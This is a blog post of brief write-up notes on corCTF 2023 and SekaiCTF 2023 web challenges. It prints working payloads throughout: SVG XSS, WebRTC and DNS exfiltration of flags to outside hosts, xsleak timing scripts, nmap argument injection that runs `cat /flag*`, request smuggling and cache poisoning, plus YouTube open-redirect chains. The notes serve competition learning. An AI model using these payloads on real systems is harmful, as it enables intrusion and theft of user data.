---
title: corCTF 2023 & Sekai CTF 2023 筆記
catalog: true
date: 2023-09-02 14:10:44
tags: [Security]
categories: [Security]
photos: /img/corctf-sekaictf-2023-writeup/cover.png
---

這兩場都有稍微參加一下，但不是每一題都有看，這篇純粹做個筆記而已，稍微記一下解法，不會太詳細。

老樣子，筆記一下關鍵字：

1. GraphQL batch query + alias
2. Python os.path.join 絕對路徑
3. Svg XSS, foreignObject
4. WebRTC CSP bypass
5. Status code xsleak
6. DNS rebinding
7. nmap command injection
8. ruby rack 上傳檔案暫存
9. buildConstraintViolationWithTemplate EL injection
10. request smuggling
11. document.baseURI
12. 200/404 status code xsleak

<!-- more -->

## corCTF 2023

題目的原始碼都在這邊：https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web
部分 web 題的 writeup：https://brycec.me/posts/corctf_2023_challenges

### force (118 solves)

pin 碼的值有 10000 種可能，需要在 10 個 request 以內用 GraphQL query 找出正確的值。

解法就是用 batch query + alias，一個請求就可以試很多次（取自底下的文章）：

```
{
  flag0:flag(pin:0),
  flag1:flag(pin:1),
  flag2:flag(pin:2),
  flag3:flag(pin:3),
  flag4:flag(pin:4),
  flag5:flag(pin:5)
}
```

其他人的 writeup：

1. https://siunam321.github.io/ctf/corCTF-2023/web/force/
2. https://github.com/hanzotaz/corctf2023_writeup/

### msfrognymize (64 solves)

重點是底下這一段的程式碼：

``` python
@app.route('/anonymized/<image_file>')
def serve_image(image_file):
    file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
    if ".." in file_path or not os.path.exists(file_path):
        return f"Image {file_path} cannot be found.", 404
    return send_file(file_path, mimetype='image/png')
```

Python 的 `os.path.join` 有一個眾所皆知的行為是當你要 join 的東西是一個絕對路徑的時候，前面都會被忽略：

```
>>> os.path.join('/tmp/abc', 'test.txt')
'/tmp/abc/test.txt'
>>> os.path.join('/tmp/abc', '/test.txt')
'/test.txt'
```

因此這題利用這個特性就可以做到任意讀檔，拿到 flag。

參考資料：https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/

### frogshare (33 solves)

這題使用了一個叫做 [svg-loader](https://github.com/shubhamjain/svg-loader) 的 library，可以自動載入一個 SVG URL，因此這題是基於 SVG 的 XSS。

在引入的時候為了安全性，會自動把 script 以及 inline script 等等的東西移除，但是漏掉了 `<foreignObject>` 這個東西，這標籤可以讓你在 SVG 裡面載入 HTML，搭配 iframe srcdoc 來使用就可以繞過：

``` xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

  <foreignObject>
    <iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
  </foreignObject>
</svg>
```

再來就是繞過 CSP，這題最後是用 `<base>` 來改變 script 載入的位置來達成。

參考資料：
1. https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/

而 Renwa 的解法則是在 iframe 裡面重建 app，並藉由 Next.js 的特性來插入 script：https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd

### youdirect (5 solves)

這題就是找到 YouTube 上的 open redirect，簡單明瞭。

@EhhThing 提供的（點了會登出），串了兩層 open redirect：

https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394

@pew 提供的：
https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew

@Josh 提供的：
https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&v=-5Rm9ymMTRA&html_redirect=1

這個比較特別，其實 YouTube 影片敘述的連結每一個都會產生一個 redirect link，但是在網頁上都有綁定 session ID，所以換個裝置就不能使用了，而這個是在 mobile app 上面產生的，可以是因為 mobile app 沒有 cookie 所以不受限制，有趣。

### crabspace (4 solves)

第一步是用 tera 的 SSTI leak 出環境變數：`{{ get_env(name="SECRET") }}`

再來可以用 WebRTC 去繞過 CSP：

``` html
<script>
async function a(){
    c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]}
    (p=new RTCPeerConnection(c)).createDataChannel("d")
    await p.setLocalDescription()
}
a();
</script>
```

有了這兩個之後就可以偽造出一個 admin session 然後拿到 flag。

參考資料：
1. [corCTF 2023 web/crabspace Writeup](https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/)

### leakynote (3 solves)

這題在比賽中的時候有解開，簡單來講就是給你一個 free HTML injection 以及嚴格的 CSP：

```
Content-Security-Policy "script-src 'none'; object-src 'none'; frame-ancestors 'none';";
```

然後有一個 search API，成功會回傳 200，失敗回傳 404，要想辦法利用這個去 leak flag。

這題的重點之一是 CSP header 是 nginx 加上的，而 nginx 只有對 2xx 跟 3xx 會加上 header，因此如果搜尋失敗回傳 404，這個頁面是不會有 CSP 的。

因此我那時候就想出了一個用 cache probing 的方式。

我們在 note 裡面插入 `<iframe src=search?q=a>`，如果沒有找到東西，那就沒有 CSP，所以 iframe 的內容會被載入，頁面上的 CSS 也會被載入。反之，因為違反 CSP，沒有東西會被載入。

因此可以透過「CSS 有沒有被放到 cache 中」這點去 leak 出搜尋有沒有找到東西。

那時候實作的程式碼如下：

``` html
<script>
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
  async function clearCache() {
    let controller = new AbortController();
    let signal = controller.signal;
    fetch('https://leakynote.be.ax/assets/normalize.css',{
      mode: "no-cors",
      signal: signal,
      cache: 'reload'
    })
    await sleep(0)
    controller.abort();
    await sleep(100)
  }

  async function testNote(title, url) {
    // open note page
    var w = window.open(url)

    // wait 1s
    await sleep(1000)

    // clear cache and wait again
    await clearCache()
    await sleep(1500)

    // now the iframe should load, do cache probing
    const now = performance.now()
    await fetch('https://leakynote.be.ax/assets/normalize.css', {
      mode: 'no-cors',
      cache: 'force-cache'
    })
    const end = performance.now()
    fetch(`/report?title=${title}&ms=${end-now}`)
    if (end-now >= 4) {
      fetch('/maybe/' + title)
    }
    // cached(no result) => 2~3ms
    // no cache(found) => 4.8~5.8ms
    w.close()
  }

  // copy paste the following from python script
  async function main() {
    await testNote('{a','https://leakynote.be.ax/post.php?id=c9193aee91b0fc29')
await testNote('{c','https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2')
await testNote('{d','https://leakynote.be.ax/post.php?id=0c6caa61575b9478')
await testNote('{e','https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be')
await testNote('{f','https://leakynote.be.ax/post.php?id=71652df64d54c0e4')
await testNote('{g','https://leakynote.be.ax/post.php?id=354f3bec25e02332')
await testNote('{k','https://leakynote.be.ax/post.php?id=066aa475493e1a4c')
await testNote('{l','https://leakynote.be.ax/post.php?id=54a12f7b11098d2a')
await testNote('{o','https://leakynote.be.ax/post.php?id=621591145bcfc8e0')
await testNote('{r','https://leakynote.be.ax/post.php?id=6b44725cb5e274f0')
await testNote('{t','https://leakynote.be.ax/post.php?id=e025b26e5e7117a1')
await testNote('{y','https://leakynote.be.ax/post.php?id=f10001d89230485e')
await testNote('{z','https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad')
  }

  main()
</script>
```

賽後看到另外兩位的解法也很有趣，其中一個是透過載入字體來 leak，當你這樣做的時候：

``` css
@font-face {
    font-family: a;
    src: url(/time-before),url(/search.php?query=corctf{a),url(/search.php?query=corctf{a),... /*10000 times */,url(/time-after)
}
```

Chrome 會根據 status code 來判斷怎麼處理，如果是 200 就會偵測是不是合法的字體，如果是 404 就直接失敗，因此可以用字體載入的時間來判斷 status code。

ref: https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45

另一位也是利用 CSS 檔案有沒有載入的特性，只是不是利用 cache，而是利用一次打開大量頁面造成 server side 忙碌，響應時間變慢，透過這點來判斷。

ref: https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09

### pdf-pal (2 solves)

這題的 nginx config 長這樣：

```
location / {
    proxy_pass http://localhost:7777;

    location ^~ /generate {
        allow 127.0.0.1;
        deny all;
    }

    location ^~ /rename {
        allow 127.0.0.1;
        deny all;
    }
}
```

所以照理來說是無法訪問到 `/generate` 路徑，但可以利用 gunicorn 跟 nginx 的 parser 差異來繞過：

```
POST /generate{chr(9)}HTTP/1.1/../../ HTTP/1.1
```

相關 ticket：https://github.com/benoitc/gunicorn/issues/2530

繞過之後就可以用 `/generate` 的功能去產生 PDF，但是因為這個 service 本身有擋一些 block list，所以沒辦法直接把 flag 變成 PDF。

解法是利用 DNS rebinding 去 POST `http://localhost:7778`，就可以拿到 response。

例如說我們現在有個 domain `example.com`，背後有兩個 A record，一個指向真的 ip，另一個指向 0.0.0.0，這時候 admin bot 訪問 `http://example.com:7778/`，解析真的 IP，成功取得頁面。

這時我們把 server 關掉，然後去執行 `fetch('http://example.com:7778/generate')`，此時因為原本的 ip 已經無法訪問，瀏覽器就會轉為 0.0.0.0，成功把 request 發到我們想要的位置，也因為是 same-origin 所以可以拿到 response。

更多細節可以參考：
1. https://github.com/nccgroup/singularity
2. https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)

### lemon-csp (1 solve)

找到 0 day 的 CSP bypass，沒有公開解法。

### 0day (1 solve)

這題是找到 VM2 的 1day，沒有公開解法。

## SekaiCTF 2023

題目的原始碼都在這裡：https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web

### Scanner Service (146 solves)

輸入 port 跟 host，會執行底下程式碼：

``` ruby
nmap -p #{port} #{hostname}
```

但是傳入的資料會先經過 sanitizer，有字元限制。

tab 可以用，所以可以用 tab 來新增參數，比賽中的時候是用了 `-iL /flag.txt -oN -` 來過關的，把輸出導到 stdout，或是用 `/dev/stdout` 也成立。

官方的 writeup 是先用 `http-fetch` 這個 script 把檔案下載到本機，再跑一次 `nmap --script` 去執行那個腳本：

```
--script http-fetch -Pn --script-args http-fetch.destination={DOWNLOAD_DIR},http-fetch.url={NSE_SCRIPT}
--script={DOWNLOAD_DIR}/{LHOST}/{LPORT}/{NSE_SCRIPT}
```

在 Discord 中看到 @zeosutt 提供另外一種有趣的解法是運用了 rack 上傳檔案會留在 `/tmp/` 中的技巧，直接引入上傳的檔案就好：

```
curl http://35.231.135.130:32190/ -F $'service=127.0.0.1:1337\t--script\t/tmp/RackMultipart?????????????????' -F '=os.execute("cat /flag*");filename=evil'
```

### Frog-WAF (29 solves)

`buildConstraintViolationWithTemplate` 有 EL injection 的問題，剩下的是繞過 WAF。

之前有實際的產品就是出過一樣的洞：

1. [Expression Language Injection in Netflix Conductor](https://github.com/advisories/GHSA-wfj5-2mqr-7jvv)
2. [CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析](https://xz.aliyun.com/t/7889)

怎麼繞的部分可以參考底下幾篇：

1. https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py
2. https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba
3. https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00

### Chunky (16 solves)

這題有一個 cache server + backend server，請求都會先通過 cache server 再到 backend 去，然後留一份快取在 cache server 中，而目標是要污染快取。

解法直接貼 [zeyu](https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00) 的 writeup，就是像 request smuggling 那樣構造出一個兩邊理解不同的請求：

```
GET /aaaaa HTTP/1.1
Host: localhost
transfer-encoding: chunked
Content-Length: 102

0

GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP/1.1
X: GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json HTTP/1.1
Host: localhost
```

cache server 會看 `Content-Length`，把第二個請求看作是 `GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json`，而 backend server 看 `transfer-encoding`，所以看作是 `GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5`，如此一來就能用另一個 path 的 response 去污染 jwks.json，達成 cache poisoning

### Golf Jail (16 solves)

這題我有認真解，大概花了一天左右，覺得很有趣，而且程式碼很精簡。

``` php
<?php
    header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
    header("Cross-Origin-Opener-Policy: same-origin");

    $payload = "🚩🚩🚩";
    if (isset($_GET["xss"]) && is_string($_GET["xss"]) && strlen($_GET["xss"]) <= 30) {
        $payload = $_GET["xss"];
    }

    $flag = "SEKAI{test_flag}";
    if (isset($_COOKIE["flag"]) && is_string($_COOKIE["flag"])) {
        $flag = $_COOKIE["flag"];
    }
?>
<!DOCTYPE html>
<html>
    <body>
        <iframe
            sandbox="allow-scripts"
            srcdoc="<!-- <?php echo htmlspecialchars($flag) ?> --><div><?php echo htmlspecialchars($payload); ?></div>"
        ></iframe>
    </body>
</html>
```

給你一個 30 字的 free XSS，要能執行任意程式碼。

這邊的巧妙之處是用了 `<iframe srcdoc>` 搭配 `sandbox=allow-scripts`，創造出一個可以執行程式碼，但同時 origin 又是 `null`，而且 CSP 還繼承上層的執行環境。

因此你無法存取到 top 的任何資訊，包括 name 或是 location 之類的都不行。

到處找來找去之後在 document 裡面找到了 `baseURI`，發現它的值原來會繼承上層，而且是完整的 path，所以用 `<svg/onload=eval("'"+baseURI)>` 以後搭配 hash 就可以執行任意程式碼了，剛好 30 個字。

這邊之所以可以用 `baseURI` 就可以存取到 `document.baseURI`，是因為 inline event handler 的 scope 會自動被加上 document，這我在[接觸資安才發現我不懂前端](https://blog.huli.tw/2021/10/25/learn-frontend-from-security-pov/)這篇裡面有寫到過。

有了 XSS 以後，可以用 `document.childNodes[0].nodeValue` 把 flag 取出來，最後的問題就是要怎麼傳出去。這題 CSP 很嚴格，而且重新導向又不能使用，也不能 `window.open`（話說我覺得這個網頁不用開啟新的 `navigate-to` 就可以達到類似的效果，很厲害），那就只能用一些現成的繞過了。

我先試了 dns prefetch 但是沒用，發現 Chrome 在 112 的時候 release 了 [Feature: Resoure Hint "Least Restrictive" CSP](https://chromestatus.com/feature/5553640629075968)，或許這就是原因？

但沒關係，WebRTC 還是有用的，只是我自己試很久都沒試出來怎麼用，最後是看[別題的 writeup](https://ctftime.org/writeup/37702)，直接拿裡面 payload 出來用，再搭配 DNS：

``` js
var flag = document.childNodes[0].nodeValue.trim()
    .replace("SEKAI{", "").replace("}", "")
    .split("").map(c => c.charCodeAt(0)).join(".");
var p = new RTCPeerConnection({
    iceServers: [{
        urls: "stun:" + flag + ".29e6037fd1.ipv6.1433.eu.org:1337"
    }]
});
p.createDataChannel("d");
p.setLocalDescription()
```

### Leakless Note (4 solves)

前面寫過的 leakynote 的進階版，這次 CSP 變嚴格，多了 `default-src 'self'`，然後頁面上也沒有其他 css 檔案了。

情境一樣，有一個 iframe，可能會載入可能沒載入，要能偵測到這點。

作者 strellic 的解法是：

``` js
// leakless note oracle
const oracle = async (w, href) => {
    const runs = [];
    for (let i = 0; i < 8; i++) {
        const samples = [];
        for (let j = 0; j < 600; j++) {
            const b = new Uint8Array(1e6);
            const t = performance.now();
            w.frames[0].postMessage(b, "*", [b.buffer]);
            samples.push(performance.now() - t);
            delete b;
        }
        runs.push(samples.reduce((a,b)=>a+b, 0));
        w.location = href;
        await sleep(500); // rate limit
        await waitFor(w);
    }
    runs.sort((a,b) => a-b);
    return {
        median: median(runs.slice(2, -2)),
        sum: runs.slice(2, -2).reduce((a,b)=>a+b,0),
        runs
    }
}
```

當你對 iframe 送一個很大的 message 的時候，花費的時間會不一樣。

另一隊似乎是開了 1000 個 tab 然後去測網路的時間，現在想想發現好像還滿合理的？如果 iframe 是 200 的話就會發出一堆 request，拖慢網路速度。


